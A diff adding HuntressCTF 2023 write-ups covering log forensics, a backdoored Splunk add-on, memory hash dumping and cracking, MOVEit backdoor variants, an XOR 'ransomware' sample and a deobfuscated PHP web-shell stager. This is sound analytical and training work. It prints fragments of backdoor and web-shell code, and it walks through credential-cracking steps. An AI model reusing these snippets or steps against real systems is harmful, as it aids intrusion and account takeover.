@@ -9,8 +9,14 @@ Here are my solutions for the challenges I solved as a part of HuntressCTF 2023.
 - [[Forensics] Dumpster Fire (Easy)](#dumpster-fire)
 - [[Forensics] Wimble (Easy)](#wimble)
 - [[Forensics] Traffic (Medium)](#traffic)
+- [[Forensics] Rogue Inbox (Medium)](#rogue-inbox)
+- [[Forensics] Backdoored Splunk (Medium)](#backdoored-splunk)
+- [[Forensics] Bad Memory (Medium)](#bad-memory)
 - [[Forensics] Tragedy (Medium)](#tragedy)
 - [[Forensics] Texas Chainsaw Massacre: Tokyo Drift (Hard)](#texas-chainsaw-massacre-tokyo-drift)
+- [[Malware] HumanTwo (Easy)](#humantwo)
+- [[Malware] BlackCat (Easy)](#blackcat)
+- [[Malware] PHP Stager (Easy)](#php-stager)
 
 ## F12
 During this challenge we are presented with a website that has a button with the text "Capture The Flag" and, when clicked, opens a popup for a split second. The actual code behind the button is:
@@ -207,7 +213,145 @@ One of the files referenced was the flag:
 ```
 
 ## Traffic
-This was a 7z archive containing Zeek log exports.
+I spent some time looking through the logs and collecting some baseline information for these exports. Some notes:
+
+- From the `conn.*.log` files, there are two DNS servers being used, `1.1.1.1` and `1.0.0.1`
+- There is one internal host seen at `10.24.0.2`
+- The following HTTP User-Agents are seen from this host (Sourced from the `http.*.log` files:
+  - `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36`
+  - `Microsoft-CryptoAPI/10.0`
+  - `MICROSOFT_DEVICE_METADATA_RETRIEVAL_CLIENT`
+
+The first place I wanted to look at were the DNS logs. After all, if the user connected to a suspected malicious site, the site must have been queried. I started filtering it down, removing some TLDs such as `.edu`, `.gov` to reduce noise. I found the following suspect entry:
+
+```
+1.1.1.1	53	udp	9027	0.043605	sketchysite.github.io
+```
+
+The domain `sketchysite.github.io` resolved to the following addresses:
+- `185.199.108.153`
+- `185.199.109.153`
+- `185.199.110.153`
+- `185.199.111.153`
+
+I visited this site and it had the flag listed:
+
+```
+flag{}
+```
+
+## Rogue Inbox 
+The challenge states that the user DebraB has potentially been compromised. From the provided M365 logs, it seems this user's E-mail address is ```DebraB@M365B132131.OnMicrosoft.com```.
+
+After some preliminary log analysis, I came up with the following timeline of interesting events tied to the account:
+
+```
+9/26/2023 1:52 DebraB login from 185.73.124.135
+9/26/2023 1:56 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
+9/26/2023 1:56 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "l"}]
+9/26/2023 1:57 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "a"}]
+9/26/2023 1:57 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "g"}]
+9/26/2023 1:58 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "{"}]
+9/26/2023 1:58 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
+9/26/2023 1:59 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
+9/26/2023 1:59 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "c"}]
+9/26/2023 2:00 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
+9/26/2023 2:00 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
+9/26/2023 2:01 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "3"}]
+9/26/2023 2:01 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
+9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
+9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "a"}]
+9/26/2023 2:02 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "d"}]
+9/26/2023 2:03 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "e"}]
+9/26/2023 2:03 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "e"}]
+9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
+9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "3"}]
+9/26/2023 2:04 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "9"}]
+9/26/2023 2:05 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
+9/26/2023 2:05 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "b"}]
+9/26/2023 2:06 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "2"}]
+9/26/2023 2:06 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "c"}]
+9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "8"}]
+9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "5"}]
+9/26/2023 2:07 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
+9/26/2023 2:08 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
+9/26/2023 2:08 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "7"}]
+9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "4"}]
+9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "b"}]
+9/26/2023 2:09 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "0"}]
+9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "f"}]
+9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "6"}]
+9/26/2023 2:10 DebraB creates InboxRule Parameters: [{ "Name": "Name", "Value" : "}"}]
+```
+
+The `New-Inbox` operations are one of the first things I look for from prior experience working on business email compromise incidents. I just used Excel to analyze these logs, and filtered for the suspected compromised account and for the operation `New-Inbox`. Normally an attacker does not create this many rules, but extracting the rule names gives us the flag:
+
+```
+flag{24c4230fa7d50eef392b2c850f74b0f6}
+```
+
+## Backdoored Splunk
+This is an instance-based challenge. When I connect to the instance I get the following error:
+
+```
+$ curl -i http://chal.ctf.games:30866/
+HTTP/1.1 401 UNAUTHORIZED
+Content-Type: application/json
+Content-Length: 52
+
+{"error":"Missing or invalid Authorization header"}
+```
+
+At this point I assumed that to get the flag it was necessary to authorize ourselves. The challenge file is a copy of a Splunk Add-on for Windows directory, for version `8.7.0`. I didn't know much about this so I took a look at the [documentation](https://docs.splunk.com/Documentation/AddOns/released/Windows/AbouttheSplunkAdd-onforWindows), which didn't reveal much.
+
+Looking at the files, I noticed most of them were created on `5/10/2023`, but there was a directory of PowerShell scripts that was created on `9/19/2023`. I started to look for any credentials that may have been included in these scripts and found this in the file `nt6-health.ps1`:
+
+```
+$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
+```
+
+So I passed this over to the instance:
+
+```
+$ curl -i http://chal.ctf.games:30866/ -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 69
+
+<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->
+```
+
+Then decoded the returned Base64:
+
+```
+$ echo "ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==" | base64 -d
+echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
+```
+
+## Bad Memory
+This was a memory forensics challenge, so I enlisted the help of volatility. The decompressed file was 4GB.
+
+I wasn't sure what password was being requested. I went ahead assuming it was the user profile's password for their user account.
+
+Initially I tried to see if there was anything in the password reminder questions, located in `SAM\Domains\Account\Users\000003E9` but this didn't turn up any results as they were filled with nonsense answers.
+
+Next, I dumped the user account hashes:
+
+```
+python vol.py -f image.bin windows.hashdump
+Volatility 3 Framework 2.5.2
+User	rid		lmhash								nthash
+congo	1001	aad3b435b51404eeaad3b435b51404ee	ab395607d3779239b83eed9906b4fb92
+```
+
+I ran the nthash through crackstation and got a match for the password `goldfish#`. All that was left was to get the MD5 hash:
+
+```
+$ echo -n 'goldfish#' | md5sum
+2eb53da441962150ae7d3840444dfdde  -
+```
+
+Therefore, the flag is `flag{2eb53da441962150ae7d3840444dfdde}`.
 
 ## Tragedy
 This file appeared to be a ZIP archive:
@@ -399,4 +543,151 @@ The Base64-encoded TXT record returns:
 ```
 Start-Process "https://youtu.be/561nnd9Ebss?t=16"
 #flag{409537347c2fae01ef9826c2506ac660}#
+```
+
+## HumanTwo
+This was a large collection of `human2.aspx` backdoors from the MOVEIt incident. I ran a diff on a few of them and the only lines that differed were in the `Page_load()` function on line 36. For example:
+
+```
+if (!String.Equals(pass, "24068cbf-de5f-4cd2-9ad6-ba7cdb7bbfa9"))
+if (!String.Equals(pass, "3b321587-d075-4221-9628-b6c8959841df"))
+```
+
+So I dumped all of these lines and found one that was far different from the rest: 
+
+```
+if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))
+```
+
+The UUIDs here are actually ASCII encoded as hexadecimal. The flag after converting it is:
+
+```
+flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}
+```
+
+## Snake Eater
+
+
+## BlackCat
+This was the first reverse engineering/malware challenge of the CTF. It is a ransomware sample with a few files that were encrypted by it. The ransom note states that it uses "military-grade encryption." Taking a look at the samples of encrypted files, the entropy looked too low to be something like AES so I knew right away something was up.
+
+I started messing around with inserting different keys into the program. It seems that the minimum length of the key is 8 characters, anything less and it complains that the key is too small and refuses to decrypt the files.
+
+After some more testing, I noticed it seems to have something to do with XOR. Look at what happens when we use the key `ABCDEFGH`.
+
+```
+Encrypted:
+00000000  28 0A 16 1D 06 0C 08 49 0E 16 53 0B 03 03 08 49  |(......I..S....I|
+00000010  0B 0A 01 08 4F 11 00 49 0A 1B 54 1E 4F 11 0E 0F  |....O..I..T.O...|
+00000020  06 4E 79 67 09 0E 0E 0E 18 5F 4A 5F 58 56 5B 0B  |.Nyg....._J_XV[.|
+00000030  56 5A 47 5F 5F 52 5C 5A 00 5A 16 0F 56 06 59 59  |VZG__R\Z.Z..V.YY|
+00000040  5A 0A 12 0E 5A 07 57 5B 50 12                    |Z...Z.W[P.|
+
+Decrypted:
+00000000  69 48 55 59 43 4A 4F 01 4F 54 10 4F 46 45 4F 01  |iHUYCJO.OT.OFEO.|
+00000010  4A 48 42 4C 0A 57 47 01 4B 59 17 5A 0A 57 49 47  |JHBL.WG.KY.Z.WIG|
+00000020  47 0C 3A 23 4C 48 49 46 59 1D 09 1B 1D 10 1C 43  |G.:#LHIFY......C|
+00000030  17 18 04 1B 1A 14 1B 12 41 18 55 4B 13 40 1E 11  |........A.UK.@..|
+00000040  1B 48 51 4A 1F 41 10 13 11 50                    |.HQJ.A...P|
+
+Encrypted XOR Decrypted:
+00000000  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
+00000010  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
+00000020  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
+00000030  41 42 43 44 45 46 47 48 41 42 43 44 45 46 47 48  |ABCDEFGHABCDEFGH|
+00000040  41 42 43 44 45 46 47 48 41 42                    |ABCDEFGHAB|
+```
+
+Since we already know that the flag file probably contains only the flag, and begins with `flag{` and ends with `}`, we can probably derive most of the key by XORing these with the ciphertext. For instance, `flag{ XOR 28 0A 16 1D 06 = Nfwz}`.
+
+Well, long story short after about an hour of writing a brute-force script, the first part of the `flag.txt` file was NOT `flag{`!! To solve this I managed to find the original decrypted `Bliss_Windows_XP.png` and XORd it with the provided encrypted version, and got: 
+
+```
+00000000  63 6f 73 6d 6f 62 6f 69 63 6f 73 6d 6f 62 6f 69  |cosmoboicosmoboi|
+```
+
+Putting that into the executable as the key resulted in the following flag file:
+
+```
+00000000  4b 65 65 70 69 6e 67 20 6d 79 20 66 6c 61 67 20  |Keeping my flag |
+00000010  68 65 72 65 20 73 6f 20 69 74 27 73 20 73 61 66  |here so it's saf|
+00000020  65 21 0a 0a 66 6c 61 67 7b 30 39 32 37 34 34 62  |e!..flag{092744b|
+00000030  35 35 34 32 30 30 33 33 63 35 65 62 39 64 36 30  |55420033c5eb9d60|
+00000040  39 65 61 63 35 65 38 32 33 7d                    |9eac5e823}|
+```
+
+Fortunately, the same key is used for every encrypted file, otherwise this would not have worked. This was my favorite challenge so far and I would love to see how others have solved it as well :)
+
+## PHP Stager
+This challenge was a PHP script that contained a large encoded string variable. To solve it I simply ran it step by step, printing every intermediate variable as I went. For instance, the script contains the following obfuscated code:
+
+```
+$k = $oZjuNUpA325('n'.''.''.'o'.''.''.'i'.''.'t'.''.'c'.''.'n'.''.'u'.'f'.''.''.''.''.'_'.''.''.''.'e'.''.'t'.''.'a'.''.'e'.''.''.''.''.'r'.''.''.''.''.'c');
+```
+
+I want to know the value of $k, so after this line I added `print_r($k);` which gave me its value:
+
+```
+create_function
+```
+
+This is used on the next line:
+
+```
+$k("/*XAjqgQvv4067*/", $fsPwhnfn8423( deGRi($fsPwhnfn8423($gbaylYLd6204), "tVEwfwrN302")));
+```
+
+Printing some more variables:
+
+```
+$fsPwhnfn8423 = base64_decode
+```
+
+The end of the script becomes:
+
+```
+$c = create_function("/*XAjqgQvv4067*/", base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302")));
+```
+
+If we get the value of `base64_decode( deGRi(base64_decode($gbaylYLd6204), "tVEwfwrN302"))`, it returns an embedded PHP script:
+
+```
+global $auth_pass,$color,$default_action,$default_use_ajax,$default_charset,$sort;
+global $cwd,$os,$safe_mode, $in;
+$auth_pass = 'edbc761d111e1b86fb47681d9f641468';
+$color = "#df5";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'Windows-1251';
+if(!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
+    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
+...
+```
+
+The script itself looks like a remote access tool with a few functionalities like finding files or spawning a remote shell. The remote shell seems to be implemented as a Perl script, and has the following interesting line:
+
+```
+my $str = <<END;
+begin 644 uuencode.uu
+F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
+`
+end
+END
+```
+
+If we decode `F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`, we get the flag:
+
+```
+$ uudecode 
+begin 644 uuencode.uu
+F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT
+`
+end
+$ cat uuencode.uu 
+flag{9b5c4313d12958354be6284fcd63dd26}
 ```
